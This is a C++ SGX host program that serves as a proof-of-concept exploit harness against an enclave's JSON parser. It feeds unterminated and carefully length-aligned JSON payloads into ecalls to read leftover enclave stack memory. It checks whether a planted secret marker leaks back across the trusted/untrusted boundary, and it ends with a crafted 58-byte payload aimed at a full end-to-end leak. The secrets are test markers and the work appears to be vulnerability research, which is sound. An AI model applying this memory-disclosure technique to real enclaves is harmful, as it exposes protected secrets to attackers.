#include <cstdio>
#include <cstring>
#include <cstdlib>

#include "sgx_urts.h"
#include "Enclave_u.h"

static void* find_bytes(const void* haystack, size_t hlen, const void* needle, size_t nlen)
{
    if (nlen == 0 || nlen > hlen) return NULL;
    const unsigned char* h = (const unsigned char*)haystack;
    for (size_t i = 0; i + nlen <= hlen; i++)
    {
        if (memcmp(h + i, needle, nlen) == 0) return (void*)(h + i);
    }
    return NULL;
}

#define ENCLAVE_FILE "enclave.signed.so"

extern "C" void ocall_checkpoint(const char* msg)
{
    printf("[checkpoint] %s\n", msg);
    fflush(stdout);
}

static const char* MARKER = "TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_SECRET";

static void run_one(sgx_enclave_id_t eid, const char* label, const char* payload, uint32_t payload_len)
{
    printf("\n=== [%s] payload (%u bytes): %.*s\n", label, payload_len, payload_len, payload);

    char out[65536];
    memset(out, 0, sizeof(out));
    uint32_t out_used = 0;
    int unmarshal_status = 0;

    sgx_status_t ecall_ret = ecall_run_leak_test(
        eid, (const uint8_t*)payload, payload_len, out, (uint32_t)sizeof(out), &out_used, &unmarshal_status);

    if (ecall_ret != SGX_SUCCESS)
    {
        printf("[%s] ECALL FAILED (enclave likely aborted/crashed): sgx_status=0x%x\n", label, ecall_ret);
        return;
    }

    printf("[%s] ECALL returned OK -- enclave did NOT crash. unmarshal_status=%d\n", label, unmarshal_status);
    if (out_used > 0)
    {
        printf("[%s] returned bytes (%u):\n%.*s\n", label, out_used, out_used, out);
    }
    if (out_used > 0 && strstr(out, MARKER) != NULL)
    {
        printf("[%s] *** LEAK CONFIRMED via JSON parse path ***\n", label);
    }

    // Ground-truth raw dump of the leftover region right after the
    // attacker-controlled bytes, bypassing parson entirely.
    uint8_t raw[4096];
    memset(raw, 0, sizeof(raw));
    sgx_status_t dump_ret = ecall_dump_raw(eid, (const uint8_t*)payload, payload_len, raw, (uint32_t)sizeof(raw));
    if (dump_ret != SGX_SUCCESS)
    {
        printf("[%s] ecall_dump_raw FAILED: sgx_status=0x%x\n", label, dump_ret);
        return;
    }
    if (find_bytes(raw, sizeof(raw), MARKER, strlen(MARKER)) != NULL)
    {
        printf("[%s] *** RAW DUMP CONTAINS SECRET MARKER at leftover offset -- real leak substrate present ***\n", label);
    }
    else
    {
        printf("[%s] raw dump does NOT contain the marker in the first %zu bytes past payload.\n", label, sizeof(raw));
    }
    // Show first 128 bytes of the leftover region for manual inspection.
    printf("[%s] first 96 leftover bytes (hex): ", label);
    for (int i = 0; i < 96; i++) printf("%02x ", raw[i]);
    printf("\n[%s] first 96 leftover bytes (ascii): ", label);
    for (int i = 0; i < 96; i++)
    {
        unsigned char c = raw[i];
        putchar((c >= 32 && c < 127) ? c : '.');
    }
    printf("\n");
}

int main(int argc, char** argv)
{
    (void)argc;
    (void)argv;

    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_status_t ret = sgx_create_enclave(ENCLAVE_FILE, SGX_DEBUG_FLAG, &token, &updated, &eid, NULL);
    if (ret != SGX_SUCCESS)
    {
        printf("[App] sgx_create_enclave failed: 0x%x\n", ret);
        return 1;
    }
    printf("[App] enclave created, eid=%lu\n", (unsigned long)eid);

    // 1. The exact confirmed ASan-crash-reproducing input: unterminated "value" string.
    {
        const char payload[] = "[{\"key\":\"a\",\"value\":\"value}]";
        run_one(eid, "unterminated-value", payload, (uint32_t)(sizeof(payload) - 1));
    }

    // 2. Unterminated "key" string instead (different, earlier scan point).
    {
        const char payload[] = "[{\"key\":\"a";
        run_one(eid, "unterminated-key", payload, (uint32_t)(sizeof(payload) - 1));
    }

    // 3. Unterminated number value (different parson scan function).
    {
        const char payload[] = "[{\"key\":\"a\",\"value\":12345";
        run_one(eid, "unterminated-number", payload, (uint32_t)(sizeof(payload) - 1));
    }

    // 4. Trailing whitespace scan with no closer at all -- minimal payload,
    //    maximal leftover region exposed.
    {
        const char payload[] = "[";
        run_one(eid, "minimal-array-open", payload, (uint32_t)(sizeof(payload) - 1));
    }

    // 5. Aligned to the observed marker-cycle boundary (offset 41, derived
    //    from test #1's raw dump: "LEAK_MARKER_KEY" begins 13 bytes into the
    //    leftover region when payload_len=28, i.e. absolute offset 41).
    //    Prefix is valid JSON ending on a dangling comma (expecting the next
    //    object member key) -- if leftover marker cycles parse as valid
    //    "key":"value" members, this tests whether a FULL successful parse
    //    (status=1) carrying leaked bytes all the way back to the host is
    //    achievable, vs. crashing once the dirtied region runs out.
    {
        const char payload[] = "[{\"k\":\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",";
        uint32_t plen = (uint32_t)(sizeof(payload) - 1);
        printf("\n[align-check] payload length = %u (expected 41)\n", plen);
        run_one(eid, "aligned-marker-cycle", payload, plen);
    }

    // 6. Alignment probe for the self-closing marker (MARKER2): dump raw
    //    leftover bytes for a minimal 1-byte payload to find where the
    //    "{...}]" cycle begins, so we can craft an exact-length prefix.
    {
        const char payload[] = "[";
        uint32_t plen = (uint32_t)(sizeof(payload) - 1);
        uint8_t raw[256];
        memset(raw, 0, sizeof(raw));
        sgx_status_t r = ecall_dump_raw2(eid, (const uint8_t*)payload, plen, raw, (uint32_t)sizeof(raw));
        printf("\n[align2-probe] dump_raw2 status=0x%x, first 128 bytes:\n", r);
        for (int i = 0; i < 128; i++) putchar((raw[i] >= 32 && raw[i] < 127) ? raw[i] : '.');
        printf("\n");
    }

    // 7. Full end-to-end leak attempt: payload = '[' + 57 spaces (valid
    //    JSON whitespace, 58 bytes total) so the leftover region picks up
    //    exactly at MARKER2's '{' cycle start (offset 58, computed from
    //    test #6's dump). json_parse_string() only needs to reach the
    //    first ']' to consider the top-level array complete.
    {
        char payload[58];
        payload[0] = '[';
        for (int i = 1; i < 58; i++) payload[i] = ' ';
        uint32_t plen = 58;

        printf("\n=== [full-leak-attempt] payload = '[' + 57 spaces (%u bytes)\n", plen);
        char out[65536];
        memset(out, 0, sizeof(out));
        uint32_t out_used = 0;
        int status = 0;
        sgx_status_t r = ecall_run_leak_test2(eid, (const uint8_t*)payload, plen, out, (uint32_t)sizeof(out), &out_used, &status);
        if (r != SGX_SUCCESS)
        {
            printf("[full-leak-attempt] ECALL FAILED (crashed): sgx_status=0x%x\n", r);
        }
        else
        {
            printf("[full-leak-attempt] ECALL OK, unmarshal_status=%d\n", status);
            printf("[full-leak-attempt] returned (%u bytes): %.*s\n", out_used, out_used, out);
            if (status == 1 && find_bytes(out, out_used, "LEAKED_TOP_SECRET_ENCLAVE_STATE", 32) != NULL)
            {
                printf("[full-leak-attempt] *** FULL END-TO-END LEAK CONFIRMED: secret enclave stack\n");
                printf("[full-leak-attempt] *** content parsed successfully and returned across the\n");
                printf("[full-leak-attempt] *** trusted/untrusted boundary as legitimate JSON output. ***\n");
            }
        }
    }

    printf("\n[App] now probing exactly how far past the 262144-byte buffer reads stay safe...\n");
    fflush(stdout);
    ecall_probe_bounds(eid);
    printf("[App] probe finished without crashing (unexpected if a hard boundary exists nearby).\n");

    sgx_destroy_enclave(eid);
    return 0;
}
